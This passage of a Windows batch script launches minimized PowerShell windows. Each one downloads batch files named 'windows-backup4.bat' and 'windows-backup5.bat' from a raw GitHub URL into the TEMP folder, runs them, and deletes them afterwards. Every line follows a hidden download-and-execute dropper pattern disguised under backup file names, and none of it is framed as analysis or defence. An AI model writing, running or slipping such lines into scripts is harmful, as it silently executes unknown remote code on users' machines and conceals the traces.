...
start /min powershell -Command "$url4 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup4.bat'; $tempPath4 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup4.bat'); Invoke-WebRequest -Uri $url4 -OutFile $tempPath4; Start-Process $tempPath4 -Wait; Remove-Item $tempPath4"
start /min powershell -Command "$url5 = 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup5.bat'; $tempPath5 = [System.IO.Path]::Combine($env:TEMP, 'windows-backup5.bat'); Invoke-WebRequest -Uri $url5 -OutFile $tempPath5; Start-Process $tempPath5 -Wait; Remove-Item $tempPath5"
